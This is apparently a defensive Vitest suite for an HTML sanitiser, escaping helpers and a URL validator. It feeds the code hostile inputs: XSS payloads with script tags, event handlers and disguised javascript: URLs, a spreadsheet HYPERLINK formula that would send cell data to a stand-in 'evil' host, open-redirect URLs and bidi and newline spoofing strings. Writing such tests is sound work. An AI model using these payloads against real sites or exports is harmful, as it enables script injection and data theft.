import { createElement } from 'react';
import { renderToString } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import {
  escapeHtml,
  escapeJsonForHtml,
  installTrustedTypes,
  normaliseText,
  preloadSanitizer,
  safeCsvCell,
  safeUrl,
  sanitizeHtml,
  sanitizeHtmlSync,
  singleLineText,
} from '../src/index.js';
import { SafeHtml } from '../src/react.js';

describe('sanitizeHtml', () => {
  it('refuses the sync path before the sanitiser is loaded, rather than returning input', () => {
    expect(() => sanitizeHtmlSync('<b>x</b>')).toThrow();
  });

  it('removes script, event handlers and javascript: URLs', async () => {
    const clean = await sanitizeHtml(
      '<p onclick="x()">hi</p><script>alert(1)</script><img src=x onerror=alert(1)><a href="javascript:alert(1)">l</a>',
      { allowLinks: true },
    );
    expect(clean).not.toMatch(/script|onclick|onerror|javascript:/i);
    expect(clean).toContain('<p>hi</p>');
  });

  it('forces rel=noopener on links, and rejects protocol-relative hrefs', async () => {
    const clean = await sanitizeHtml('<a href="https://ok.example">a</a><a href="//evil.example">b</a>', { allowLinks: true });
    expect(clean).toContain('rel="noopener noreferrer nofollow"');
    expect(clean).not.toContain('evil.example');
  });

  it('drops data-* attributes, which frameworks read as instructions', async () => {
    expect(await sanitizeHtml('<div data-hx-get="/admin/delete">x</div>')).toBe('<div>x</div>');
  });

  it('keeps its link hook private: the page’s own DOMPurify is unchanged', async () => {
    await preloadSanitizer();
    const DOMPurify = (await import('dompurify')).default;
    expect(DOMPurify.sanitize('<a href="https://ok.example">a</a>')).not.toContain('target');
  });
});

describe('installTrustedTypes', () => {
  it('falls back to a sanitising shim where Trusted Types are unsupported', async () => {
    await preloadSanitizer();
    const policy = installTrustedTypes();
    expect(policy.supported).toBe(false);
    expect(policy.createHTML('<img src=x onerror=alert(1)>')).not.toContain('onerror');
  });
});

describe('SafeHtml', () => {
  it('renders sanitised markup synchronously once preloaded', async () => {
    await preloadSanitizer();
    const html = renderToString(createElement(SafeHtml, { html: '<b>ok</b><script>alert(1)</script>' }));
    expect(html).toBe('<div><b>ok</b></div>');
  });
});

describe('escaping', () => {
  it('escapes for text and quoted attributes', () => {
    expect(escapeHtml(`<a href="x" onclick='y'>&`)).toBe('&lt;a href=&quot;x&quot; onclick=&#39;y&#39;&gt;&amp;');
  });

  it('keeps inline JSON from closing its script element', () => {
    expect(escapeJsonForHtml({ bio: '</script><script>alert(1)</script>' })).not.toContain('</script>');
  });

  it('neutralises spreadsheet formulas in CSV exports', () => {
    expect(safeCsvCell('=HYPERLINK("https://evil?d="&A1)')).toBe(`"'=HYPERLINK(""https://evil?d=""&A1)"`);
    expect(safeCsvCell(42)).toBe('"42"');
  });

  it('strips bidi overrides and newlines where a single line is expected', () => {
    expect(normaliseText('admin\u202Etxt.exe')).toBe('admintxt.exe');
    expect(singleLineText('line one\nforged line')).toBe('line one forged line');
  });
});

describe('safeUrl', () => {
  it.each([
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    'java\tscript:alert(1)',
    ' javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:x',
    '//evil.example',
    '/\\evil.example',
    '\\\\evil.example',
    'https://trusted.example@evil.example/',
  ])('rejects %j', (value) => {
    expect(safeUrl(value)).toBeNull();
  });

  it('accepts web, mail and relative URLs', () => {
    expect(safeUrl('https://example.com/a?b=1')).toBe('https://example.com/a?b=1');
    expect(safeUrl('mailto:a@example.com')).toBe('mailto:a@example.com');
    expect(safeUrl('/profile')).toBe('/profile');
    expect(safeUrl('/profile', { allowRelative: false })).toBeNull();
  });
});
